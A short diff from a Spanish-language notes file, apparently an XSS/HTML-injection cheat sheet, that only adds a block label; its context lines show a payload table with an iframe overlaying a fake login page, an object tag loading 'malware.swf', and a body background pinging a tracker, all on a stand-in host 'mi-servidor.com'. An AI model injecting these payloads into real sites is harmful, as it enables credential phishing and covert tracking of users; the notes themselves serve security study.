@@ -25,6 +25,7 @@ linked:
 |        <pre><code>`<iframe>`</code></pre>        | <pre><code>`<iframe src="https://mi-servidor.com/falso-login" style="width:100%; height:100%; border:none; position:absolute; top:0; left:0;"></iframe>`</code></pre> |            <br>**Clickjacking / Overlay.** Superpone completamente la interfaz visual de la aplicación vulnerable con una página controlada, engañando al usuario para que interactúe con ella.            |
 |  <pre><code>`<object>` / `<embed>`</code></pre>  |                                        <pre><code>`<object data="https://mi-servidor.com/malware.swf"></object>`</code></pre>                                         |           <br>**Carga de Plugins/Recursos Externos.** Utilizado históricamente para inyectar Flash malicioso o applets, forzando la ejecución de código en el contexto de plugins del navegador.           |
 |         <pre><code>`<body>`</code></pre>         |                                           <pre><code>`<body background="https://mi-servidor.com/tracker.png">`</code></pre>                                           | <br>**Tracking / Exfiltración Ciega.** Sobrescribe atributos estructurales del documento para forzar una petición HTTP GET silenciosa hacia mi servidor, útil como un ping de confirmación básica.<br><br> |
+^xss-html
 
 ### Contextos de Escapes Básicos
 
